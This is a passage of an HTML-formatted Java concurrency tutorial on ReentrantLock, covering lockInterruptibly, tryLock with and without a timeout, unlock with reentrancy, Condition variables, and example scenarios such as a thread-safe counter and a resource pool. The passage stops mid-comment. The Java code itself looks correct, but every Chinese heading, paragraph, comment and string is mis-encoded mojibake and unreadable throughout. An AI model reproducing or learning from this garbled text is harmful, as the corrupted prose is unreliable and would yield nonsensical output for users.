<p><strong>é‡è¦è­¦å‘Šï¼š</strong><code>lock()</code>å’Œ<code>unlock()</code>å¿…é¡»é…å¯¹ä½¿ç”¨ï¼Œä¸”<code>unlock()</code>å¿…é¡»æ”¾åœ¨<code>finally</code>å—ä¸­ï¼Œç¡®ä¿æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸éƒ½èƒ½é‡Šæ”¾é”ã€‚</p>
</blockquote>
<h4 data-id="heading-12">3.3 lockInterruptibly() - å¯ä¸­æ–­è·å–é”</h4>
<p>å½“çº¿ç¨‹åœ¨ç­‰å¾…é”æ—¶ï¼Œå¯ä»¥å“åº”ä¸­æ–­ã€‚è¿™åœ¨éœ€è¦å–æ¶ˆé•¿æ—¶é—´ç­‰å¾…çš„åœºæ™¯éå¸¸æœ‰ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * lockInterruptibly()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterruptibleLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * å¯ä¸­æ–­çš„è·å–é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interruptibleMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// å¦‚æœçº¿ç¨‹è¢«ä¸­æ–­ï¼Œä¼šæŠ›å‡ºInterruptedException</span>
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
            doSomething();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šå¯å–æ¶ˆçš„ä»»åŠ¡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancellableTask</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                lock.lockInterruptibly();
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡</span>
                    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) {
                        processData();
                    }
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                System.out.println(<span class="hljs-string">"ä»»åŠ¡è¢«å–æ¶ˆ"</span>);
                Thread.currentThread().interrupt();  <span class="hljs-comment">// æ¢å¤ä¸­æ–­çŠ¶æ€</span>
            }
        });
        
        worker.start();
        
        <span class="hljs-comment">// éœ€è¦å–æ¶ˆæ—¶</span>
        <span class="hljs-comment">// worker.interrupt();  // ä¼šä½¿lockInterruptibly()æŠ›å‡ºå¼‚å¸¸</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processData</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
}
</code></pre>
<h4 data-id="heading-13">3.4 tryLock() - å°è¯•è·å–é”</h4>
<p><code>tryLock()</code>æ˜¯éé˜»å¡çš„è·å–é”æ–¹æ³•ã€‚å¦‚æœé”å¯ç”¨ï¼Œç«‹å³è·å–å¹¶è¿”å›<code>true</code>ï¼›å¦åˆ™ç«‹å³è¿”å›<code>false</code>ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * tryLock()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * éé˜»å¡è·å–é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryProcess</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (lock.tryLock()) {  <span class="hljs-comment">// å°è¯•è·å–é”</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// è·å–æˆåŠŸï¼Œæ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
                doProcess();
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">finally</span> {
                lock.unlock();
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼Œæ‰§è¡Œé™çº§é€»è¾‘</span>
            System.out.println(<span class="hljs-string">"é”è¢«å ç”¨ï¼Œæ‰§è¡Œé™çº§æ“ä½œ"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šé¿å…æ­»é”çš„è½¬è´¦æ“ä½œ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transfer</span><span class="hljs-params">(Account from, Account to, <span class="hljs-type">int</span> amount)</span> {
        <span class="hljs-comment">// å°è¯•åŒæ—¶è·å–ä¸¤æŠŠé”ï¼Œé¿å…æ­»é”</span>
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">if</span> (from.lock.tryLock()) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">if</span> (to.lock.tryLock()) {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-comment">// ä¸¤æŠŠé”éƒ½è·å–æˆåŠŸï¼Œæ‰§è¡Œè½¬è´¦</span>
                            from.debit(amount);
                            to.credit(amount);
                            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                        } <span class="hljs-keyword">finally</span> {
                            to.lock.unlock();
                        }
                    }
                } <span class="hljs-keyword">finally</span> {
                    from.lock.unlock();
                }
            }
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼ŒçŸ­æš‚ä¼‘çœ åé‡è¯•</span>
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">10</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doProcess</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> balance;
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">debit</span><span class="hljs-params">(<span class="hljs-type">int</span> amount)</span> { balance -= amount; }
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">credit</span><span class="hljs-params">(<span class="hljs-type">int</span> amount)</span> { balance += amount; }
}
</code></pre>
<h4 data-id="heading-14">3.5 tryLock(long time, TimeUnit unit) - è¶…æ—¶è·å–é”</h4>
<p>åœ¨æŒ‡å®šæ—¶é—´å†…å°è¯•è·å–é”ã€‚å¦‚æœåœ¨è¶…æ—¶æ—¶é—´å†…è·å–åˆ°é”ï¼Œè¿”å›<code>true</code>ï¼›å¦åˆ™è¿”å›<code>false</code>ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * tryLock(timeout)ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeoutLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * è¶…æ—¶è·å–é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">processWithTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// å°è¯•åœ¨3ç§’å†…è·å–é”</span>
            <span class="hljs-keyword">if</span> (lock.tryLock(<span class="hljs-number">3</span>, TimeUnit.SECONDS)) {
                <span class="hljs-keyword">try</span> {
                    doProcess();
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// è¶…æ—¶æœªè·å–åˆ°é”</span>
                System.out.println(<span class="hljs-string">"è·å–é”è¶…æ—¶"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// ç­‰å¾…è¿‡ç¨‹ä¸­è¢«ä¸­æ–­</span>
            System.out.println(<span class="hljs-string">"ç­‰å¾…é”æ—¶è¢«ä¸­æ–­"</span>);
            Thread.currentThread().interrupt();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šå¸¦è¶…æ—¶çš„åˆ†å¸ƒå¼é”æ¨¡æ‹Ÿ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">executeWithLock</span><span class="hljs-params">(Runnable task, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (lock.tryLock(timeout, unit)) {
                <span class="hljs-keyword">try</span> {
                    task.run();
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doProcess</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* ... */</span> }
}
</code></pre>
<h4 data-id="heading-15">3.6 unlock() - é‡Šæ”¾é”</h4>
<p>é‡Šæ”¾é”ï¼Œå°†é”çš„æŒæœ‰è®¡æ•°å‡1ã€‚å½“è®¡æ•°å˜ä¸º0æ—¶ï¼Œé”å®Œå…¨é‡Šæ”¾ï¼Œå…¶ä»–ç­‰å¾…çº¿ç¨‹å¯ä»¥ç«äº‰è·å–ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * unlock()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnlockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">/**
     * å¯é‡å…¥åœºæ™¯ä¸‹çš„unlock
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantExample</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// holdCount = 1</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"å¤–å±‚é”å®šï¼ŒholdCount = "</span> + lock.getHoldCount());
            
            lock.lock();  <span class="hljs-comment">// holdCount = 2</span>
            <span class="hljs-keyword">try</span> {
                System.out.println(<span class="hljs-string">"å†…å±‚é”å®šï¼ŒholdCount = "</span> + lock.getHoldCount());
            } <span class="hljs-keyword">finally</span> {
                lock.unlock();  <span class="hljs-comment">// holdCount = 1</span>
                System.out.println(<span class="hljs-string">"å†…å±‚é‡Šæ”¾ï¼ŒholdCount = "</span> + lock.getHoldCount());
            }
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// holdCount = 0ï¼Œé”å®Œå…¨é‡Šæ”¾</span>
            System.out.println(<span class="hljs-string">"å¤–å±‚é‡Šæ”¾ï¼ŒholdCount = "</span> + lock.getHoldCount());
        }
    }
    
    <span class="hljs-comment">/**
     *  é”™è¯¯ï¼šéé”æŒæœ‰è€…è°ƒç”¨unlock
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongUnlock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ²¡æœ‰è·å–é”å°±è°ƒç”¨unlockï¼Œä¼šæŠ›å‡ºIllegalMonitorStateException</span>
        <span class="hljs-keyword">try</span> {
            lock.unlock();  <span class="hljs-comment">//  æŠ›å‡ºå¼‚å¸¸ï¼</span>
        } <span class="hljs-keyword">catch</span> (IllegalMonitorStateException e) {
            System.out.println(<span class="hljs-string">"éé”æŒæœ‰è€…ä¸èƒ½é‡Šæ”¾é”: "</span> + e.getMessage());
        }
    }
}
</code></pre>
<h4 data-id="heading-16">3.7 newCondition() - åˆ›å»ºæ¡ä»¶å˜é‡</h4>
<p>åˆ›å»ºä¸é”å…³è”çš„<code>Condition</code>å¯¹è±¡ï¼Œç”¨äºå®ç°ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚ä¸€æŠŠé”å¯ä»¥åˆ›å»ºå¤šä¸ª<code>Condition</code>ï¼Œè¿™æ˜¯ç›¸æ¯”<code>synchronized</code>çš„é‡è¦ä¼˜åŠ¿ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * newCondition()ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// éç©ºæ¡ä»¶</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// éæ»¡æ¡ä»¶</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">10</span>];
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> putIndex, takeIndex, count;
    
    <span class="hljs-comment">/**
     * ç”Ÿäº§è€…ï¼šæ·»åŠ å…ƒç´ 
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(Object item)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—æ»¡æ—¶ï¼Œç­‰å¾…notFullæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == items.length) {
                notFull.await();
            }
            items[putIndex] = item;
            <span class="hljs-keyword">if</span> (++putIndex == items.length) putIndex = <span class="hljs-number">0</span>;
            count++;
            <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…ï¼šé˜Ÿåˆ—éç©ºäº†</span>
            notEmpty.signal();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * æ¶ˆè´¹è€…ï¼šå–å‡ºå…ƒç´ 
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—ç©ºæ—¶ï¼Œç­‰å¾…notEmptyæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) {
                notEmpty.await();
            }
            <span class="hljs-type">Object</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> items[takeIndex];
            items[takeIndex] = <span class="hljs-literal">null</span>;
            <span class="hljs-keyword">if</span> (++takeIndex == items.length) takeIndex = <span class="hljs-number">0</span>;
            count--;
            <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…ï¼šé˜Ÿåˆ—éæ»¡äº†</span>
            notFull.signal();
            <span class="hljs-keyword">return</span> item;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-17">3.8 å…¶ä»–è¾…åŠ©æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockçš„è¾…åŠ©æ–¹æ³•
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuxiliaryMethodsExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å…¬å¹³é”</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateAuxiliaryMethods</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æŸ¥è¯¢é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> lock.isLocked();
            System.out.println(<span class="hljs-string">"é”æ˜¯å¦è¢«æŒæœ‰: "</span> + locked);  <span class="hljs-comment">// true</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢å½“å‰çº¿ç¨‹çš„æŒæœ‰è®¡æ•°</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">holdCount</span> <span class="hljs-operator">=</span> lock.getHoldCount();
            System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æŒæœ‰æ¬¡æ•°: "</span> + holdCount);  <span class="hljs-comment">// 1</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">heldByMe</span> <span class="hljs-operator">=</span> lock.isHeldByCurrentThread();
            System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”: "</span> + heldByMe);  <span class="hljs-comment">// true</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢æ˜¯å¦ä¸ºå…¬å¹³é”</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">fair</span> <span class="hljs-operator">=</span> lock.isFair();
            System.out.println(<span class="hljs-string">"æ˜¯å¦ä¸ºå…¬å¹³é”: "</span> + fair);  <span class="hljs-comment">// true</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢æ˜¯å¦æœ‰çº¿ç¨‹åœ¨ç­‰å¾…è·å–é”</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWaiters</span> <span class="hljs-operator">=</span> lock.hasQueuedThreads();
            System.out.println(<span class="hljs-string">"æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹: "</span> + hasWaiters);
            
            <span class="hljs-comment">// æŸ¥è¯¢ç­‰å¾…é˜Ÿåˆ—é•¿åº¦</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">queueLength</span> <span class="hljs-operator">=</span> lock.getQueueLength();
            System.out.println(<span class="hljs-string">"ç­‰å¾…é˜Ÿåˆ—é•¿åº¦: "</span> + queueLength);
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-18">4. å…¸å‹ä½¿ç”¨åœºæ™¯</h3>
<h4 data-id="heading-19">4.1 åœºæ™¯ä¸€ï¼šçº¿ç¨‹å®‰å…¨çš„è®¡æ•°å™¨</h4>
<p>è¿™æ˜¯æœ€åŸºç¡€çš„ä½¿ç”¨åœºæ™¯ï¼Œç¡®ä¿å¤šçº¿ç¨‹ç¯å¢ƒä¸‹è®¡æ•°æ“ä½œçš„åŸå­æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * çº¿ç¨‹å®‰å…¨çš„è®¡æ•°å™¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadSafeCounter</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">/**
     * åŸå­é€’å¢
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            count++;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * åŸå­é€’å‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decrement</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            count--;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * è·å–å½“å‰å€¼ï¼ˆéœ€è¦åŠ é”ä¿è¯å¯è§æ€§ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> count;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å¦‚æœå½“å‰å€¼ç­‰äºé¢„æœŸå€¼ï¼Œåˆ™æ›´æ–°ä¸ºæ–°å€¼
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(<span class="hljs-type">long</span> expected, <span class="hljs-type">long</span> newValue)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (count == expected) {
                count = newValue;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-20">4.2 åœºæ™¯äºŒï¼šå¯ä¸­æ–­çš„èµ„æºè·å–</h4>
<p>åœ¨éœ€è¦èƒ½å¤Ÿå–æ¶ˆé•¿æ—¶é—´ç­‰å¾…çš„åœºæ™¯ä¸­ä½¿ç”¨<code>lockInterruptibly()</code>ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯ä¸­æ–­çš„èµ„æºæ± 
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterruptibleResourcePool</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">available</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;Resource&gt; resources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> maxSize;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InterruptibleResourcePool</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize)</span> {
        <span class="hljs-built_in">this</span>.maxSize = maxSize;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; maxSize; i++) {
            resources.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Resource</span>(i));
        }
    }
    
    <span class="hljs-comment">/**
     * å¯ä¸­æ–­åœ°è·å–èµ„æº
     * æ”¯æŒåœ¨ç­‰å¾…è¿‡ç¨‹ä¸­å–æ¶ˆ
     */</span>
    <span class="hljs-keyword">public</span> Resource <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lockInterruptibly();  <span class="hljs-comment">// å¯ä¸­æ–­åœ°è·å–é”</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ç­‰å¾…å¯ç”¨èµ„æº</span>
            <span class="hljs-keyword">while</span> (resources.isEmpty()) {
                available.await();  <span class="hljs-comment">// å¯ä¸­æ–­åœ°ç­‰å¾…</span>
            }
            <span class="hljs-keyword">return</span> resources.remove(<span class="hljs-number">0</span>);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å½’è¿˜èµ„æº
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(Resource resource)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            resources.add(resource);
            available.signal();  <span class="hljs-comment">// é€šçŸ¥ç­‰å¾…çº¿ç¨‹</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * ä½¿ç”¨ç¤ºä¾‹
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">InterruptibleResourcePool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterruptibleResourcePool</span>(<span class="hljs-number">2</span>);
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Resource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> pool.acquire();
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// ä½¿ç”¨èµ„æº</span>
                    resource.use();
                } <span class="hljs-keyword">finally</span> {
                    pool.release(resource);
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                System.out.println(<span class="hljs-string">"èµ„æºè·å–è¢«å–æ¶ˆ"</span>);
            }
        });
        
        worker.start();
        
        <span class="hljs-comment">// å¯ä»¥åœ¨éœ€è¦æ—¶å–æ¶ˆç­‰å¾…</span>
        <span class="hljs-comment">// worker.interrupt();</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Resource</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> id;
    
    Resource(<span class="hljs-type">int</span> id) { <span class="hljs-built_in">this</span>.id = id; }
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">use</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"ä½¿ç”¨èµ„æº: "</span> + id);
    }
}
</code></pre>
<h4 data-id="heading-21">4.3 åœºæ™¯ä¸‰ï¼šè¶…æ—¶è·å–é”é¿å…æ­»é”</h4>
<p>åœ¨å¯èƒ½å‘ç”Ÿæ­»é”çš„åœºæ™¯ä¸­ï¼Œä½¿ç”¨<code>tryLock(timeout)</code>æ¥é¿å…æ°¸ä¹…é˜»å¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
